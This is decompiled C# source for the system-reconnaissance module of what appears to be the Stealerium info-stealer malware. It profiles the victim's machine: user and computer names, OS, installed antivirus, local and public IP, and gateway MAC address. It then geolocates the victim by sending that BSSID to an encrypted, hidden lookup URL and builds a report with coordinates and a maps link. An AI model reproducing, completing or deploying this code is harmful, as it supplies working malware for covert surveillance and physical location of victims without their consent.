using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;

namespace Stealerium.Target.System;

internal sealed class SystemInfo
{
	public static string Username = Environment.UserName;

	public static string Compname = Environment.MachineName;

	public static string Culture = CultureInfo.CurrentCulture.ToString();

	public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

	[DllImport("iphlpapi.dll", ExactSpelling = true)]
	private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref uint physicalAddrLen);

	public static string ScreenMetrics()
	{
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		int width = bounds.Width;
		return string.Concat(str2: bounds.Height.ToString(), str0: width.ToString(), str1: "x");
	}

	public static string GetBattery()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			BatteryChargeStatus batteryChargeStatus = SystemInformation.get_PowerStatus().get_BatteryChargeStatus();
			string text = ((object)(BatteryChargeStatus)(ref batteryChargeStatus)).ToString();
			string text2 = SystemInformation.get_PowerStatus().get_BatteryLifePercent().ToString(CultureInfo.InvariantCulture)
				.Split(new char[1] { ',' })[^1];
			return text + " (" + text2 + "%)";
		}
		catch
		{
		}
		return "Unknown";
	}

	private static string GetWindowsVersionName()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		string text = "Unknown System";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						text = Convert.ToString(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name"));
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				text = text.Split(new char[1] { '|' })[0];
				int length = text.Split(new char[1] { ' ' })[0].Length;
				text = text.Substring(length).TrimStart(Array.Empty<char>()).TrimEnd(Array.Empty<char>());
				return text;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return text;
		}
	}

	private static string GetBitVersion()
	{
		try
		{
			return Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86") ? "(32 Bit)" : "(64 Bit)";
		}
		catch
		{
		}
		return "(Unknown)";
	}

	public static string GetSystemVersion()
	{
		return GetWindowsVersionName() + " " + GetBitVersion();
	}

	public static string GetDefaultGateway()
	{
		try
		{
			return (from g in (from n in NetworkInterface.GetAllNetworkInterfaces()
					where n.OperationalStatus == OperationalStatus.Up
					where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
					select n).SelectMany((NetworkInterface n) => n.GetIPProperties()?.GatewayAddresses)
				select g?.Address into a
				where a != null
				select a).FirstOrDefault()?.ToString();
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetAntivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						list.Add(current.get_Item("displayName").ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "Not installed";
				}
				return string.Join(", ", list.ToArray()) + ".";
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return "N/A";
	}

	public static string GetLocalIp()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
		}
		catch
		{
		}
		return "No network adapters with an IPv4 address in the system!";
	}

	public static string GetPublicIp()
	{
		try
		{
			return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[32]
			{
				23, 61, 220, 157, 111, 249, 43, 180, 122, 28,
				107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
				238, 56, 3, 133, 224, 68, 195, 226, 41, 226,
				22, 191
			})).Replace("\n", "");
		}
		catch (Exception ex)
		{
			Logging.Log("SystemInfo >> GetPublicIP : Request error\n" + ex);
		}
		return "Request failed";
	}

	private static string GetBssid()
	{
		byte[] array = new byte[6];
		uint physicalAddrLen = (uint)array.Length;
		try
		{
			if (SendARP(BitConverter.ToInt32(IPAddress.Parse(GetDefaultGateway()).GetAddressBytes(), 0), 0, array, ref physicalAddrLen) != 0)
			{
				return "unknown";
			}
			string[] array2 = new string[physicalAddrLen];
			for (int i = 0; i < physicalAddrLen; i++)
			{
				array2[i] = array[i].ToString("x2");
			}
			return string.Join(":", array2);
		}
		catch
		{
		}
		return "Failed";
	}

	public static string GetLocation()
	{
		string bssid = GetBssid();
		string text = "Unknown";
		string text2 = "Unknown";
		string text3 = "Unknown";
		string text4;
		try
		{
			using WebClient webClient = new WebClient();
			text4 = webClient.DownloadString(StringsCrypt.Decrypt(new byte[64]
			{
				239, 87, 16, 244, 130, 200, 219, 198, 121, 223,
				110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
				11, 159, 146, 91, 205, 36, 0, 49, 166, 93,
				22, 23, 221, 210, 170, 52, 17, 123, 35, 113,
				33, 136, 114, 109, 224, 65, 139, 150, 160, 210,
				179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
				68, 222, 51, 47
			}) + bssid);
		}
		catch
		{
			return "BSSID: " + bssid;
		}
		if (!text4.Contains("{\"result\":200"))
		{
			return "BSSID: " + bssid;
		}
		int num = 0;
		string[] array = text4.Split(new char[1] { ' ' });
		string[] array2 = array;
		foreach (string obj2 in array2)
		{
			num++;
			if (obj2.Contains("\"lat\":"))
			{
				text = array[num].Replace(",", "");
			}
			if (obj2.Contains("\"lon\":"))
			{
				text2 = array[num].Replace(",", "");
			}
			if (obj2.Contains("\"range\":"))
			{
				text3 = array[num].Replace(",", "");
			}
		}
		string text5 = "BSSID: " + bssid + "\nLatitude: " + text + "\nLongitude: " + text2 + "\nRange: " + text3;
		if (text != "Unknown" && text2 != "Unknown")
		{
			text5 = text5 + "\n[Open google maps](" + StringsCrypt.Decrypt(new byte[48]
			{
				59, 129, 195, 34, 227, 242, 76, 173, 34, 247,
				140, 112, 238, 245, 161, 60, 49, 127, 57, 59,
				227, 89, 70, 152, 32, 242, 56, 102, 234, 75,
				63, 18, 228, 223, 4, 147, 131, 146, 214, 158,
				87, 69, 119, 232, 58, 195, 55, 105
			}) + text + " " + text2 + ")";
		}
		return text5;
	}

	public static string GetCpuName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetGpuName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetRamAmount()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						num = (int)(Convert.ToDouble(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("TotalPhysicalMemory")) / 1048576.0);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return num + "MB";
		}
		catch
		{
		}
		return "-1";
	}
}
